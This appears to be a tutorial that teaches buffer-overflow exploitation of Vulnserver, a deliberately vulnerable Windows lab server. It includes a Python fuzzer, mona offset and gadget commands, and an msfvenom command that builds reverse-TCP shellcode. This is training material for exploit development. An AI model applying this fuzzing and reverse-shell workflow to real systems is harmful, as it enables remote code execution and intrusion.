# Vulnserver — in-repo methodology tutorial

Companion to [04-vulnserver.md](04-vulnserver.md). This is **not** a full
command-by-command solution dump (that would spoil practice). It is a
repeatable playbook you apply to each Vulnserver command.

## 0. Lab setup

1. Download [stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver).
2. On the Windows lab VM:

   ```powershell
   # Example
   .\setup\scripts\Disable-TargetMitigations.ps1 -Name vulnserver.exe
   .\vulnserver.exe
   ```

3. Confirm TCP **9999** is reachable (`nc` / Python).
4. Attach WinDBG; load mona; set working folder.

## 1. Map the surface

Connect and send `HELP` (or banner interaction). List commands. Each command
may have a different overflow site / offset / bad-char set.

Create a notes table:

| Command | Crash? | EIP/SEH | Offset | Bad chars | Gadget | Notes |
|---------|--------|---------|--------|-----------|--------|-------|
| TRUN | | | | | | |
| GMON | | | | | | |
| … | | | | | | |

## 2. Fuzz one command

```python
#!/usr/bin/env python3
import socket, os
host, port = os.environ.get("TARGET_IP","127.0.0.1"), 9999
cmd = os.environ.get("VULN_CMD", "TRUN")
s = socket.create_connection((host, port))
print(s.recv(1024))
buf = f"{cmd} ".encode() + b"A" * int(os.environ.get("FUZZ", "5000")) + b"\r\n"
s.send(buf)
```

Increase size until WinDBG breaks. Record exception type.

## 3. Pattern → offset

Same as lab 01:

```text
!mona pattern_create 5000
# send pattern after the command keyword and space
!mona findmsp
!mona pattern_offset <eip>
```

Some Vulnserver bugs are **SEH** overwrites, not direct EIP. If EIP is not
yours but SEH chain is, switch methodology:

```text
!mona seh -cpb "\x00\x0a\x0d"
```

(SEH is a later skill — if stuck, finish two direct-EIP commands first.)

## 4. Bad characters

Include at least `\x00`, `\x0a`, `\x0d` (CRLF protocol). Compare with mona.

## 5. Redirect execution

```text
!mona jmp -r esp -cpb "<bad>"
```

Prefer modules without ASLR when mitigations are relaxed for the lab.

## 6. Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -b '<bad>' -f python
```

Mind space after the redirect and any restricted characters in the command
parser (some truncate at spaces, etc.).

## 7. Stabilization checklist

- [ ] Reproducible cold start
- [ ] Documented offset + bad chars + gadget per command
- [ ] Second independent command exploited without notes

## External walkthroughs (use as hints)

- https://philkeeble.com/exploitation/windows/Vulnserver-Walkthrough-Part-1/

Type your own exploits; treat write-ups as spoilers.
